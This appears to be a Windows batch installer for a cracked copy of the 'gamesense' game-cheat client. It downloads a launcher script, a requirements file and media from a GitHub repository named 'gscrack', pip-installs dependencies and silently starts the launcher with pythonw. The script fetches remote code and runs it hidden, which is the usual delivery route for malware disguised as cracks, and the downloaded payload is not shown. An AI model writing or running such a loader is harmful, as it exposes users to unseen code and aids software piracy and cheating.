@echo off
cls

md c:\temp\gamesense\scripts
md c:\temp\gamesense\cfg

powershell Invoke-WebRequest -uri "https://github.com/ArekLubiPlacki/gscrack/raw/main/wallpaper.png" -OutFile "C:\temp\gamesense\wallpaper.png"
powershell Invoke-WebRequest -uri "https://github.com/ArekLubiPlacki/gscrack/raw/main/GsLauncher.py" -OutFile "C:\temp\gamesense\GsLauncher.py"
powershell Invoke-WebRequest -uri "https://github.com/ArekLubiPlacki/gscrack/raw/main/reqiurements.txt" -OutFile "C:\temp\gamesense\reqiurements.txt"
powershell Invoke-WebRequest -uri "https://github.com/ArekLubiPlacki/gscrack/raw/main/chipi.wav" -OutFile "C:\temp\gamesense\chipi.wav"

timeout 1 >nul
cd c:\temp\gamesense
pip install -r reqiurements.txt
timeout 1 >nul
start pythonw GsLauncher.py
exit
